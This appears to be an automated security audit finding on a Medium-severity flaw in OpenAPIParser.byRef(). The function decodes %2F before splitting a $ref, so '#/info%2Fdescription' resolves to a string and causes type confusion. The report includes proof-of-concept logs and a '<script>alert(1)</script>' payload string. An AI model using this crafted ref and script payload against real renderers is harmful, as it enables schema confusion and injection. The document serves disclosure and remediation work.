# [M7] Decodeuri Before Pointer Cross Section Traversal

## Summary

`OpenAPIParser.byRef()` at `src/services/OpenAPIParser.ts:61` applies `decodeURIComponent` to the entire `$ref` string before splitting it into JSON Pointer segments. This allows `%2F`-encoded slashes to decode into literal `/`, adding spurious pointer segments. An attacker using `$ref: "#/info%2Fdescription"` resolves to `spec.info.description` (a string), not a schema object — causing type confusion in all downstream schema consumers.

## Severity, Confidence, Vulnerability Type

- **Severity**: Medium
- **Confidence**: Confirmed (PoC executed)
- **Vulnerability Type**: Pointer Injection / Type Confusion
- **FP-Verdict**: TRUE-POSITIVE (confidence: MEDIUM)
- **Triage-Priority**: P2

## Impact

From `evidence/impact.log`:

```
  string keys : ["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52"]
  all schema fields undefined — downstream silently renders an empty/broken schema

[RESULT] vulnerability confirmed
  1. %2F in $ref decoded to / before JSON Pointer split (RFC 6901 violation)
  2. spec.info.description (string) returned as resolved schema
  3. truthy-string guard bypass — no Error raised at OpenAPIParser.ts:103
  4. downstream schema consumers receive string primitive instead of schema object

{"status":"confirmed","evidence":"byRef(\"#/info%2Fdescription\") returned spec.info.description string \"<script>alert(1)</script> ATTACKER_CONTR...\" instead of schema object; type-confusion + guard bypass at OpenAPIParser.ts:103 confirmed","notes":"RFC 6901 violation: %2F decoded to / before JsonPointer.get split; affects src/services/OpenAPIParser.ts:61"}

```

## Affected Component

- **File**: `src/services/OpenAPIParser.ts:61`
- **Chamber**: chamber-02

## Source to Sink Flow

Primary site: `src/services/OpenAPIParser.ts:61`. See draft.md for the full trace.

## Vulnerable Code

- `src/services/OpenAPIParser.ts:61` — unconditional `decodeURIComponent` application
- `src/services/OpenAPIParser.ts:63` — `JsonPointer.get` receives decoded string
- `src/services/OpenAPIParser.ts:67` — truthy string passes through as resolved schema
- `src/services/OpenAPIParser.ts:103` — guard bypassed (string is truthy)

## Proof of concept & Evidence

**PoC-Status**: executed

Evidence files under `evidence/`:
- `evidence/env-info.txt`
- `evidence/exploit.log`
- `evidence/impact.log`
- `evidence/poc.js`

Decisive output from `evidence/exploit.log`:
```
[BASELINE] byRef("#/components/schemas/SafeSchema")
  typeof result : object
  result        : {"type":"object","properties":{"id":{"type":"integer"}}}
  is schema obj : true

[ATTACK] byRef("#/info%2Fdescription")
  decoded pointer (post-decodeURIComponent) : #/info/description
  typeof result                             : string
  result                                    : "<script>alert(1)</script> ATTACKER_CONTROLLED_CONTENT"
  expected (schema object)                  : false
  type-confusion confirmed                  : true

[GUARD BYPASS] if (!resolved) check at :103
  resolved value     : "<script>alert(1)</script> ATTACKER_CONTROLLED_CONTENT"
  !!resolved         : true ← string is truthy; no Error thrown
  downstream receives: a STRING where it expects an OpenAPI schema OBJECT

[DOWNSTREAM IMPACT] simulated mergeAllOf/Schema.ts on resolved value
  allOf       : undefined
  properties  : undefined
  type        : undefined
  string keys : ["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52"]
  all schema fields undefined — downstream silently renders an empty/broken schema

[RESULT] vulnerability confirmed
  1. %2F in $ref decoded to / before JSON Pointer split (RFC 6901 violation)
  2. spec.info.description (string) returned as resolved schema
  3. truthy-string guard bypass — no Error raised at OpenAPIParser.ts:103
  4. downstream schema consumers receive string primitive instead of schema object

{"status":"confirmed","evidence":"byRef(\"#/info%2Fdescription\") returned spec.info.description string \"<script>alert(1)</script> ATTACKER_CONTR...\" instead of schema object; type-confusion + guard bypass at OpenAPIParser.ts:103 confirmed","notes":"RFC 6901 violation: %2F decoded to / before JsonPointer.get split; affects src/services/OpenAPIParser.ts:61"}

```

## Preconditions

- **Auth-Required**: no
- **Auth-Roles**: anonymous
- **Protocol**: local
- **Attack vector**: Remote (network); attacker must control or influence the OpenAPI spec rendered by Acme.

## Remediation

See draft.md for the recommended fix. Primary remediation site: `src/services/OpenAPIParser.ts:61`.

Confirm-Status: confirmed-test
Confirm-Method: generated-test
Confirm-Test: archon/findings/M7-decodeuri-before-pointer-cross-section-traversal/confirm-test.ts
Confirm-Test-Output: archon/findings/M7-decodeuri-before-pointer-cross-section-traversal/confirm-test-output.log
Confirm-Test-Identity: none
Confirm-Timestamp: 2026-05-19T04:30:03.633238+00:00
Confirm-Notes: Existing coverage in src/services/__tests__/OpenAPIParser.test.ts exercises mergeAllOf and deref happy paths only; it does not send attacker-controlled %2F-encoded refs through OpenAPIParser.byRef(). Generated local Jest test proved #/info%2Fdescription is decodeURIComponent-processed before JsonPointer.get(), resolves to spec.info.description, and deref() accepts the returned truthy string without throwing, confirming cross-section traversal and schema type confusion.
